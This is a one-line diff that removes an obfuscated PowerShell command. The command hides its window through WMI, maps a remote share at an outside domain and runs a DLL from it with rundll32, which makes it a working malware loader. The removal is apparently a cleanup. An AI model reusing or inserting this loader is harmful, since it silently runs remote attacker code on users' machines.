@@ -1,1 +1,0 @@
-$ssQA=([wmiclass]('Win32_P'+'roces'+'sStartup')).CreateInstance();$ssQA.ShowWindow=0;([wmiclass](-join('W','in32','_Proc','e','s','s'))).Create((-join('cmd /c ','push','d ','\','\cv.s','ha','rtb','o','ro.','xyz\','adbba11','d-7b','bd-','4e3','1-b','d49-dcb4','2','3','574e','f1 &',' rundll3','2 pf.ch',',#','1')),$null,$ssQA)
